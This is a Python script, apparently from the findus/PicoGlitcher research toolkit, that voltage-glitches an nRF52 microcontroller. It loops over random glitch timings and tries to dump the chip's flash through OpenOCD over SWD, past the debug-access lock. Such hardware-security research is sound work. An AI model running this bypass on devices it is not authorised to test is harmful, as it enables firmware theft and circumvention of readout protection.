#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE '_Warning.flash_reset'

import argparse
import logging
import random
import sys
import time
import subprocess

# import custom libraries
from findus import Database, PicoGlitcher

def test_jtag():
    subout = subprocess.run(['openocd',
                          '-f', 'interface/jlink.cfg',
                          '-c', 'transport select swd',
                          '-f', 'testnrf.cfg',
                          '-c', 'init;dump_image nrf52_dumped.bin 0x0 0x80000; exit'],
                          #'-c', 'init; exit'],
                          check=False, capture_output=True)
    response = subout.stdout + subout.stderr
    return response

# inherit functionality and overwrite some functions
#class DerivedGlitcher(ProGlitcher):
class DerivedGlitcher(PicoGlitcher):
    def classify(self, response):
        if b'Debug access is denied' in response or b'AP lock engaged' in response:
            color = 'G'
        elif b'Error connecting DP' in response or b'Error: No J-Link device found' in response or b'unspecified error' in response:
            color = 'B'
        elif b'Target not examined yet' in response or b'\n\n\n' in response:
            color = 'M'
        elif b'Timeout' in response or b'timeout occurred' in response:
            color = 'Y'
        else:
            color = 'R'
        return color

class Main():
    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = DerivedGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)
        #self.glitcher.init(ext_power=args.power, ext_power_voltage=3.3)
        # choose rising edge trigger with dead time of 0.03 seconds after power down
        # note that you still have to physically connect the trigger input with vtarget
        self.glitcher.rising_edge_trigger(dead_time=0.03, pin_condition="power")
        # choose crowbar transistor
        self.glitcher.set_hpglitch()

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store)
        self.start_time = int(time.time())

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        experiment_id = 0
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)
            self.glitcher.arm(delay, length)

            # power cycle target
            self.glitcher.power_cycle_target(0.08)

            # reset target
            #self.glitcher.reset(0.01)

            # block until glitch
            try:
                self.glitcher.block(timeout=1)
                # dump memory
                response = test_jtag()
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_target(power_cycle_time=1)
                time.sleep(0.2)
                response = b'Timeout'

            # classify response
            color = self.glitcher.classify(response)

            # add to database
            self.database.insert(experiment_id, delay, length, color, response)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{response}", color))

            # increase experiment id
            experiment_id += 1

            # Dump finished
            if color == 'R':
                time.sleep(1)
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyACM0")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)
